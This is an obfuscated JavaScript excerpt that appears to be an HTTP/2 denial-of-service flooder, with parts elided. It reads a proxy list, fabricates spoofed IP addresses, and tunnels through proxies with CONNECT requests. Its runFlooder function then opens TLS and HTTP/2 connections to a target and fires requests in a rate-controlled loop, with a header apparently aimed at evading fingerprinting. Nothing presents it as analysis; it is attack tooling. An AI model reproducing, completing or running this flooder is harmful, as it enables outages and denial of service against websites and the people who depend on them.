...
function readLines(_0x13eb0a) {
  return fs.readFileSync(_0x13eb0a, 'utf-8').toString().split(/\r?\n/)
}
function randomIntn(_0x1ed0a6, _0x79b3ee) {
  return Math.floor(Math.random() * (_0x79b3ee - _0x1ed0a6) + _0x1ed0a6)
}
function randomElement(_0x25ddd0) {
  return _0x25ddd0[randomIntn(0, _0x25ddd0.length)]
}
function randstr(_0x4fd673) {
  const _0x5459b4 =
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let _0x75152d = ''
  const _0x55b0ae = _0x5459b4.length
  for (let _0x2252db = 0; _0x2252db < _0x4fd673; _0x2252db++) {
    _0x75152d += _0x5459b4.charAt(Math.floor(Math.random() * _0x55b0ae))
  }
  return _0x75152d
}
const ip_spoof = () => {
    ...
    return (
      _0x11b40a() + '.' + _0x11b40a() + '.' + _0x11b40a() + '.' + _0x11b40a()
    )
  },
  spoofed = ip_spoof(),
  ip_spoof2 = () => {
...
class NetSocket {
  constructor() {}
  ['HTTP'](_0x8213ff, _0x1a599f) {
    const _0x1198de = _0x8213ff.address.split(':'),
      _0x294060 = _0x1198de[0],
      _0x153808 =
        'CONNECT ' +
        _0x8213ff.address +
        ':443 HTTP/1.1\r\nHost: ' +
      ...
      _0x353e66 = new Buffer.from(_0x153808),
      _0x476a72 = net.connect({
        host: _0x8213ff.host,
        port: _0x8213ff.port,
      })
    _0x476a72.setTimeout(_0x8213ff.timeout * 600000)
    _0x476a72.setKeepAlive(true, 100000)
    _0x476a72.on('connect', () => {
      _0x476a72.write(_0x353e66)
    })
    _0x476a72.on('data', (_0x4dd247) => {
      const _0x4616ea = _0x4dd247.toString('utf-8'),
        _0x34eb42 = _0x4616ea.includes('HTTP/1.1 200')
      if (_0x34eb42 === false) {
        return (
          _0x476a72.destroy(),
          _0x1a599f(undefined, 'error: invalid response from proxy server')
        )
      }
      return _0x1a599f(_0x476a72, undefined)
    })
    _0x476a72.on('timeout', () => {
      return (
        _0x476a72.destroy(), _0x1a599f(undefined, 'error: timeout exceeded')
      )
    })
    _0x476a72.on('error', (_0x44187b) => {
      return _0x476a72.destroy(), _0x1a599f(undefined, 'error: ' + _0x44187b)
    })
  }
}
var hd = {}
...
function runFlooder() {
  const _0x5e885a = randomElement(proxies),
    _0x2cb5cb = _0x5e885a.split(':'),
    _0x301131 = {
      host: _0x2cb5cb[0],
      port: ~~_0x2cb5cb[1],
  ...
  Socker.HTTP(_0x301131, (_0x4fef99, _0x3a0124) => {
    ...
    const _0xe69cc7 = {
      ...
      _0x4699da = tls.connect(443, parsedTarget.host, _0xe69cc7)
    _0x4699da.setKeepAlive(true, 60000)
    const _0x4e8ff8 = http2.connect(parsedTarget.href, {
      protocol: 'https:',
      settings: {
    ...
    _0x4e8ff8.on('connect', () => {
      const _0x4e40dc = setInterval(() => {
        const _0x950a04 = {
          ...headers,
        ...
        for (let _0x7cc1ab = 0; _0x7cc1ab < args.Rate; _0x7cc1ab++) {
          headers.ja3 = jar
          const _0x2fa65c = _0x4e8ff8.request(_0x950a04)
          _0x4e8ff8.on('response', (_0x4aa0b0) => {
            _0x2fa65c.close()
            _0x2fa65c.destroy()
            return
          })
  ...
  ;(function (_0xb98dd5, _0x3aa632, _0x5ecb9f) {})
}
